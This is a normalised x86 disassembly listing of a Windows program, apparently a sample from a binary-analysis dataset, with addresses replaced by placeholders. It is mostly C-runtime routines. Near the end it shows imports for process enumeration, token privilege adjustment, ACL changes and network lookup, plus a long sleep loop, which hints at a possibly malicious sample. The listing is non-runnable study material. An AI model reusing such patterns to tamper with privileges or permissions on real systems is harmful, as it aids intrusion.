call sub_412e23
add esp 0x14
mov [ ebp + 0xc ] eax
push 0x0
push [ ebp + 0x8 ]
push ebx
call sub_410abc
add esp 0xc
mov eax esi
pop edi
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
push ebx
call sub_410abc
push ebx
call sub_411124
add esp 0x10
push eax
call [ SetEndOfFile@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
dec esi
cmp esi 0xffffffff
jne r-xdata
push eax
lea eax [ ebp - 0x1000 ]
push eax
push ebx
call sub_40eabd
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop esi
pop ebx
leave
retn
mov [ rw-data ] 0xd
call [ GetLastError@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x5
jne r-xdata
sub edi eax
test edi edi
jle r-xdata
or esi 0xffffffff
mov [ rw-data ] 0xd
push [ ebp + 0xc ]
push ebx
call sub_412e23
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
mov eax 0x1000
cmp edi eax
jge r-xdata
sub_41251e
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
xor eax eax
lea ecx [ edx + esi ]
cmp ecx edx
jb r-xdata
push 0x1
pop eax
cmp ecx esi
jae r-xdata
mov edx [ esp + 0x10 ]
pop esi
mov [ edx ] ecx
retn
sub_41253f
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
push esi
push [ edi ]
push [ esi ]
call sub_41251e
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push [ edi + 0x4 ]
push [ eax ]
call sub_41251e
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push 0x1
push [ eax ]
call sub_41251e
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x8 ]
push [ eax ]
call sub_41251e
add esp 0xc
pop edi
pop esi
retn
inc [ esi + 0x8 ]
inc [ esi + 0x8 ]
sub_41259d
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ecx esi
add esi esi
mov [ eax ] esi
lea esi [ edi + edi ]
shr ecx 0x1f
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
mov [ eax + 0x4 ] esi
shr edx 0x1f
shl ecx 0x1
or ecx edx
pop edi
mov [ eax + 0x8 ] ecx
pop esi
retn
sub_4125cb
mov eax [ esp + 0x4 ]
push esi
push edi
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
mov esi edx
mov edi ecx
shl esi 0x1f
shr ecx 0x1
or ecx esi
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
shl edi 0x1f
shr ecx 0x1
shr edx 0x1
or ecx edi
pop edi
mov [ eax + 0x8 ] edx
mov [ eax ] ecx
pop esi
retn
sub_4125f8
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
cmp eax edx
push esi
mov [ ebp - 0x4 ] 0x404e
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
jbe r-xdata
cmp [ ebx + 0x8 ] edx
jne r-xdata
push edi
mov [ ebp + 0x10 ] eax
mov esi 0x8000
mov ecx [ ebx + 0x4 ]
mov eax ecx
shr eax 0x10
mov [ ebx + 0x8 ] eax
mov eax [ ebx ]
mov esi eax
shr esi 0x10
shl ecx 0x10
or esi ecx
shl eax 0x10
add [ ebp - 0x4 ] 0xfff0
mov [ ebx + 0x4 ] esi
mov [ ebx ] eax
jmp r-xdata
mov esi ebx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_41259d
push ebx
call sub_41259d
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_41253f
push ebx
call sub_41259d
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
movsx eax [ eax ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_41253f
add esp 0x1c
inc [ ebp + 0x8 ]
dec [ ebp + 0x10 ]
jne r-xdata
xor edx edx
pop edi
mov ax [ ebp - 0x4 ]
pop esi
mov [ ebx + 0xa ] ax
pop ebx
leave
retn
push ebx
call sub_41259d
add [ ebp - 0x4 ] 0xffff
pop ecx
jmp r-xdata
test [ ebx + 0x8 ] esi
jne r-xdata
sub_4126bf
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push 0x1
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp + 0x10 ] edi
inc edi
jmp r-xdata
cmp cl 0x9
je r-xdata
mov cl [ edi ]
cmp cl 0x20
je r-xdata
cmp cl 0xa
je r-xdata
cmp cl 0xd
jne r-xdata
push 0x4
pop esi
cmp eax 0xa
je r-xdata
jmp [ eax * 4 + jump_table_412b60 ]
mov eax [ ebp + 0xc ]
cmp [ ebp - 0x10 ] 0x0
mov [ eax ] edi
je r-xdata
jmp r-xdata
cmp bl 0x31
jl r-xdata
cmp bl 0x31
mov [ ebp - 0x10 ] edx
jl r-xdata
cmp bl 0x31
jl r-xdata
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x24 ] edx
jne r-xdata
cmp [ rw-data ] edx
mov [ ebp - 0x24 ] edx
jle r-xdata
lea ecx [ edi - 0x2 ]
cmp bl 0x31
mov [ ebp + 0x10 ] ecx
jl r-xdata
mov [ ebp - 0x20 ] edx
cmp bl 0x31
jl r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x1
xor esi esi
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4 ] eax
jbe r-xdata
mov bl [ edi ]
inc edi
cmp eax 0xb
ja r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp bl 0x39
jg r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_40e3a6
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
cmp [ rw-data ] edx
jle r-xdata
cmp bl 0x30
jne r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_40e3a6
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl 0x31
jl r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp bl 0x30
jne r-xdata
cmp bl 0x39
jg r-xdata
push 0xa
dec edi
pop eax
movsx eax bl
lea ecx [ edi - 0x1 ]
sub eax 0x2b
mov [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_40e3a6
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
or eax [ ebp - 0x28 ]
pop edi
mov [ ecx + 0x6 ] esi
mov [ ecx + 0x2 ] ebx
mov [ ecx + 0xa ] ax
mov eax [ ebp - 0x14 ]
pop esi
mov [ ecx ] dx
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ ebp - 0x45 ] 0x5
jl r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
push 0x5
jmp r-xdata
push 0x3
jmp r-xdata
mov eax esi
jmp r-xdata
cmp bl 0x2b
je r-xdata
cmp bl 0x30
jne r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_40e3a6
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
dec [ ebp - 0x8 ]
mov bl [ edi ]
inc edi
jmp r-xdata
mov edi [ ebp + 0x10 ]
jmp r-xdata
mov eax esi
jmp r-xdata
test eax eax
je r-xdata
push 0x7
dec eax
dec eax
je r-xdata
push 0x9
dec edi
jmp r-xdata
cmp bl 0x39
jg r-xdata
cmp bl 0x30
jne r-xdata
jmp r-xdata
dec eax
dec eax
jne r-xdata
mov [ ebp - 0x1c ] esi
movsx ecx bl
lea eax [ esi + esi * 4 ]
lea esi [ ecx + eax * 2 - 0x30 ]
cmp esi 0x1450
jg r-xdata
test eax eax
je r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
jmp r-xdata
dec eax
cmp [ eax ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
dec eax
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebp - 0x45 ]
and [ ebp - 0x28 ] 0x0
push 0x2
pop eax
jmp r-xdata
dec eax
dec eax
je r-xdata
pop eax
jmp r-xdata
pop eax
dec edi
push 0xb
jmp r-xdata
cmp bl 0x2d
je r-xdata
mov eax edx
jmp r-xdata
cmp bl 0x2b
je r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
dec edi
jmp r-xdata
or [ ebp - 0x18 ] 0xffffffff
push 0x7
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
push 0x8
jmp r-xdata
mov edi ecx
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_40e3a6
pop ecx
pop ecx
jmp r-xdata
mov esi 0x1451
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x5c ]
push [ ebp - 0x4 ]
push eax
call sub_4125f8
mov eax [ ebp - 0x1c ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x18 ] ecx
jge r-xdata
dec [ ebp - 0x4 ]
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
push 0x2
mov [ ebp - 0x28 ] 0x8000
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp bl 0x30
je r-xdata
cmp bl 0x2d
je r-xdata
cmp [ rw-data ] edx
jle r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
xor ebx ebx
mov eax 0x7fff
mov esi 0x80000000
xor edx edx
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
add eax [ ebp - 0x8 ]
cmp [ ebp - 0x20 ] ecx
jne r-xdata
neg eax
jmp r-xdata
cmp bl 0x43
jle r-xdata
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x1
cmp [ ebp - 0x24 ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp bl 0x45
jle r-xdata
cmp eax 0x1450
jle r-xdata
sub eax [ ebp + 0x1c ]
push 0x6
jmp r-xdata
cmp bl 0x63
jle r-xdata
cmp eax 0xffffebb0
jge r-xdata
mov [ ebp - 0x2c ] 0x1
cmp bl 0x65
jg r-xdata
push [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_4130b9
mov edx [ ebp - 0x40 ]
mov ebx [ ebp - 0x3e ]
mov esi [ ebp - 0x3a ]
mov eax [ ebp - 0x36 ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
sub_412b90
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov ecx eax
mov esi 0x7fff
and ecx 0x8000
and eax esi
test cx cx
push edi
mov [ ebp - 0x1c ] 0xcc
mov [ ebp - 0x1b ] 0xcc
mov [ ebp - 0x1a ] 0xcc
mov [ ebp - 0x19 ] 0xcc
mov [ ebp - 0x18 ] 0xcc
mov [ ebp - 0x17 ] 0xcc
mov [ ebp - 0x16 ] 0xcc
mov [ ebp - 0x15 ] 0xcc
mov [ ebp - 0x14 ] 0xcc
mov [ ebp - 0x13 ] 0xcc
mov [ ebp - 0x12 ] 0xfb
mov [ ebp - 0x11 ] 0x3f
mov [ ebp - 0x4 ] 0x1
mov edx eax
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx si
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp + 0xc ]
test dx dx
jne r-xdata
movzx eax dx
mov ecx edi
mov esi eax
shr ecx 0x18
imul eax eax 0x4d10
shr esi 0x8
and [ ebp - 0x10 ] 0x0
push 0x1
lea ecx [ esi + ecx * 2 ]
mov [ ebp - 0x6 ] dx
imul ecx ecx 0x4d
mov [ ebp - 0xa ] edi
lea esi [ ecx + eax - 0x134312f4 ]
mov eax [ ebp + 0x8 ]
sar esi 0x10
mov [ ebp - 0xe ] eax
movsx eax si
neg eax
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4130b9
add esp 0xc
cmp [ ebp - 0x6 ] 0x3fff
jb r-xdata
mov eax 0x80000000
mov [ ebx ] 0x1
cmp edi eax
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
test [ ebp + 0x18 ] 0x1
mov [ ebx ] si
je r-xdata
lea eax [ ebp - 0x1c ]
inc esi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_412e99
pop ecx
pop ecx
test edi 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov edi [ ebp + 0x14 ]
movsx eax si
add edi eax
test edi edi
jg r-xdata
test cx cx
je r-xdata
push r--data
jmp r-xdata
and [ ebx + 0x5 ] 0x0
push 0x1
pop eax
jmp r-xdata
movzx esi [ ebp - 0x6 ]
sub esi 0x3ffe
and [ ebp - 0x6 ] 0x0
mov [ ebp + 0x1c ] 0x8
push 0x15
pop edi
cmp edi 0x15
jle r-xdata
jmp r-xdata
cmp edi eax
jne r-xdata
cmp edi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_4119d0
pop ecx
mov [ ebx + 0x3 ] 0x6
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call sub_41259d
dec [ ebp + 0x1c ]
pop ecx
jne r-xdata
test esi esi
jge r-xdata
push r--data
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
lea ecx [ edi + 0x1 ]
lea eax [ ebx + 0x4 ]
test ecx ecx
mov [ ebp + 0x1c ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
push r--data
push r--data
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ eax - 0x1 ]
dec eax
dec eax
cmp cl 0x35
lea ecx [ ebx + 0x4 ]
jl r-xdata
mov [ ebp + 0x14 ] ecx
lea eax [ ebp - 0x10 ]
push eax
call sub_4125cb
dec esi
pop ecx
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_4119d0
pop ecx
mov [ ebx + 0x3 ] 0x5
pop ecx
cmp eax ecx
jb r-xdata
cmp eax ecx
jb r-xdata
lea esi [ ebp - 0x10 ]
lea edi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
movsd [ edi ] [ esi ]
call sub_41259d
lea eax [ ebp - 0x10 ]
push eax
call sub_41259d
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41253f
lea eax [ ebp - 0x10 ]
push eax
call sub_41259d
mov al [ ebp - 0x5 ]
mov ecx [ ebp + 0x1c ]
and [ ebp - 0x5 ] 0x0
add esp 0x14
add al 0x30
inc [ ebp + 0x1c ]
dec [ ebp + 0x14 ]
mov [ ecx ] al
jne r-xdata
mov eax [ ebp + 0x1c ]
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ecx ] 0x30
cmp [ eax ] 0x30
jne r-xdata
inc eax
inc [ ebx ]
cmp [ eax ] 0x39
jne r-xdata
cmp eax ecx
jae r-xdata
dec eax
jmp r-xdata
cmp eax ecx
jae r-xdata
mov [ eax ] 0x30
dec eax
jmp r-xdata
sub al bl
sub al 0x3
mov [ ebx + 0x3 ] al
movsx eax al
and [ eax + ebx + 0x4 ] 0x0
inc [ eax ]
sub_412e23
mov eax [ esp + 0x4 ]
push esi
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea edx [ ecx + eax * 8 + 0x4 ]
mov cl [ ecx + eax * 8 + 0x4 ]
test cl 0x1
je r-xdata
mov al cl
mov esi 0x8000
and eax 0x80
cmp [ esp + 0xc ] esi
jne r-xdata
cmp [ esp + 0xc ] 0x4000
jne r-xdata
and cl 0x7f
jmp r-xdata
mov [ rw-data ] 0x16
jmp r-xdata
or cl 0x80
neg eax
sbb eax eax
mov [ edx ] cl
and ax 0xc000
add eax esi
pop esi
retn
or eax 0xffffffff
pop esi
retn
sub_412e99
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov cx [ ebx + 0xa ]
xor eax eax
push edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov ax [ esi + 0xa ]
mov edi ecx
mov edx 0x7fff
xor edi eax
and eax edx
and ecx edx
and edi 0x8000
cmp ax 0x7fff
lea edx [ ecx + eax ]
mov [ ebp + 0x8 ] edx
jae r-xdata
neg di
sbb edi edi
and [ esi + 0x4 ] 0x0
and edi 0x80000000
add edi 0x7fff8000
and [ esi ] 0x0
mov [ esi + 0x8 ] edi
cmp cx 0x7fff
jae r-xdata
cmp dx 0xbffd
ja r-xdata
cmp dx 0x3fbf
ja r-xdata
test ax ax
mov edx 0x7fffffff
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc [ ebp + 0x8 ]
test [ esi + 0x8 ] edx
jne r-xdata
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
jmp r-xdata
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0xc ] 0x5
inc [ ebp + 0x8 ]
test [ ebx + 0x8 ] edx
jne r-xdata
xor eax eax
cmp [ esi + 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
add [ ebp - 0x4 ] 0x2
inc [ ebp - 0x10 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
add eax esi
lea ecx [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x18 ] eax
cmp [ ebx + 0x4 ] eax
jne r-xdata
cmp cx ax
jne r-xdata
cmp [ esi ] eax
jne r-xdata
mov eax [ ebp - 0x10 ]
add eax eax
cmp [ ebp + 0xc ] 0x0
jle r-xdata
add [ ebp + 0x8 ] 0xc002
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
add [ ebp - 0x8 ] 0x2
sub [ ebp - 0xc ] 0x2
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax ]
cmp [ ebx ] eax
jne r-xdata
jmp r-xdata
add [ ebp + 0x8 ] 0xffff
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
test [ ebp - 0x19 ] 0x80
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
imul eax ecx
mov ecx [ ebp - 0x4 ]
add ecx 0xfffffffc
push ecx
push eax
push [ ecx ]
call sub_41251e
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0xa ] ax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x8000
ja r-xdata
movsx eax [ ebp + 0x8 ]
neg eax
add [ ebp + 0x8 ] eax
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_41259d
add [ ebp + 0x8 ] 0xffff
pop ecx
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ ebp - 0x22 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x24 ]
and eax 0x1ffff
cmp eax 0x18000
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_4125cb
dec ebx
pop ecx
jne r-xdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x22 ]
and [ ebp - 0x22 ] 0x0
cmp [ ebp - 0x1e ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x24 ] 0x1
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov cx [ ebp - 0x22 ]
or eax edi
mov [ esi ] cx
mov ecx [ ebp - 0x20 ]
mov [ esi + 0x2 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ esi + 0x6 ] ecx
inc [ ebp - 0x1e ]
jmp r-xdata
and [ ebp - 0x1e ] 0x0
cmp [ ebp - 0x1a ] 0xffff
jne r-xdata
or [ ebp - 0x24 ] 0x1
inc [ ebp - 0x1a ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp - 0x1a ] 0x8000
jmp r-xdata
sub_4130b9
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx rw-data
xor ecx ecx
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
pop ebx
leave
retn
jge r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ ebp + 0xc ]
mov ebx rw-data
neg eax
mov [ ebp + 0xc ] eax
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
push esi
push edi
cmp [ ebp + 0xc ] ecx
jne r-xdata
lea eax [ eax + eax * 2 ]
cmp [ ebx + eax * 4 ] 0x8000
lea esi [ ebx + eax * 4 ]
jb r-xdata
mov eax [ ebp + 0xc ]
add ebx 0x54
sar [ ebp + 0xc ] 0x3
and eax 0x7
cmp eax ecx
je r-xdata
pop edi
pop esi
push esi
push [ ebp + 0x8 ]
call sub_412e99
pop ecx
pop ecx
xor ecx ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0xa ]
lea esi [ ebp - 0xc ]
sub_413146
push [ esp + 0x4 ]
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
test al 0x1
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_40ec6a
pop ecx
xor eax eax
retn
test [ esp + 0x8 ] 0x2
je r-xdata
mov [ rw-data ] 0xd
mov [ rw-data ] 0x5
jmp r-xdata
or eax 0xffffffff
retn
sub_40104c
mov eax r-xdata
retn
sub_401430
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call WSAStartup
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_401760
push esi
mov esi [ Sleep@IAT ]
call sub_402ff0
call sub_4027c0
call sub_402300
push 0x112a880
call esi
jmp r-xdata
sub_403670
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x0
push ecx
call [ AdjustTokenPrivileges@IAT ]
retn
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
SetSecurityInfo
jmp [ SetSecurityInfo@IAT ]
SetEntriesInAclA
jmp [ SetEntriesInAclA@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
gethostname
jmp [ gethostname@IAT ]
sub_4087c0
push ebp
mov ebp esp
mov eax rw-data
pop ebp
retn
sub_4087ca
push ebp
mov ebp esp
mov eax 0x2
sub eax [ ebp + 0x8 ]
mov eax [ eax * 4 + rw-data ]
pop ebp
retn
sub_408807
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
call sub_40c7f4
add esp 0x4
pop ebp
retn
sub_408b36
push ebp
mov ebp esp
pop ebp
retn
WNetCloseEnum
jmp [ WNetCloseEnum@IAT ]
sub_40bed2
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40bed9
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40c0ff
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40c1a4
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40c22e
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_40c1a4
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40c25a
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_40c4f5
call sub_40ea45
test eax eax
jne r-xdata
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40e8d5
add esp 0x10
retn
retn
sub_40c515
push 0x40
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_40c4f5
add esp 0xc
retn
sub_40c897
call sub_40c8af
call sub_40f5c1
mov [ rw-data ] eax
call sub_40f571
fnclex
retn
sub_40c8ae
retn
sub_40c8af
mov eax sub_40f9af
mov [ rw-data ] sub_40f644
mov [ rw-data ] eax
mov [ rw-data ] sub_40f6aa
mov [ rw-data ] sub_40f5ea
mov [ rw-data ] sub_40f692
mov [ rw-data ] eax
retn
sub_40cb08
cmp [ rw-data ] 0x1
jne r-xdata
push [ esp + 0x4 ]
call sub_4104cd
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_410494
sub_40d2f3
push [ ebp - 0x14 ]
call sub_40d32a
pop ecx
retn
sub_40d32a
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_40d78c
xor eax eax
retn
sub_40d457
push [ ebp - 0x14 ]
call sub_40d4c7
pop ecx
retn
sub_40d6a9
push 0x1
pop eax
retn
sub_40d6ad
mov esp [ ebp - 0x18 ]
jmp sub_40d78c
sub_40d70b
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_40d714
mov esp [ ebp - 0x18 ]
jmp sub_40d78c
sub_40d7c9
push 0x1
pop eax
retn
sub_40d81f
push 0x1
pop eax
retn
sub_40e12c
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_40e139
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_40e149
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_40e267
push 0x1
pop eax
retn
sub_40e31b
push 0x1
pop eax
retn
sub_40e590
push 0x1
call sub_40e599
pop ecx
retn
sub_40f571
push 0x30000
push 0x10000
